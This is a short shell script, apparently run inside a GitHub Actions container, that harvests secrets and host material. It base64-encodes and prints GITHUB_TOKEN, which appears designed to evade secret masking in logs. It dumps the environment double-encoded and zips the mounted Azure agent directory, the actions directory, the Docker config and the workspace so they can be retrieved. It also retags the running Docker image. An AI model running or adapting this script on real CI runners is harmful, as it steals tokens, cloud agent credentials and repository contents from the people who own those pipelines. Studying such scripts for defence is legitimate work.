#/usr/bin/busybox sh

#print base64 encoded token
if [[ ! -z "$GITHUB_TOKEN" ]]; then
 b64_token=$(echo "$GITHUB_TOKEN" | base64 -)
 printf 'The token is: %s\n' "$b64_token"
fi

#print root dir
printf 'Github dir:\n'
find /github | base64 | base64

#print env before
printf 'Action env before:\n'
env | base64 | base64

#extract waagent if mounted
if [[ -d '/waagent' ]]; then
 printf 'Copying waagent\n'
 find /waagent
 zip -r waagent.zip /waagent
 chown 1001 waagent.zip
 cp waagent.zip /workspace/
fi

#extract actions if mounted
if [[ -d '/actions' ]]; then
 printf 'Copying actions\n'
 find /actions
 zip -r actions.zip /actions
 chown 1001 actions.zip
 cp actions.zip /workspace/
fi

#copy temp docker config
if [[ -d '/temp-dir' ]]; then
 printf 'Copying temp-dir\n'
 find /temp-dir
 zip -r temp-dir.zip /temp-dir
 chown 1001 temp-dir.zip
 cp temp-dir.zip /workspace/
fi

#copy workspace
printf 'Copying workspace\n'
zip -r /github.zip /github/workspace
chown 1001 /github.zip
mv /github.zip /github/workspace/

#print images and containers before
docker image ls
docker container ps -a

#retag current image so we can refer to it later
export image_id="$(docker container ps -a --format json --filter 'status=running' | jq -s 'sort_by(.CreatedAt) | reverse' | jq -r '.[0].Image')"
docker tag $image_id dind-multiarch:latest

#print images and containers after
docker image ls
docker container ps -a

#print env after
printf 'Action env after:\n'
env | base64 | base64
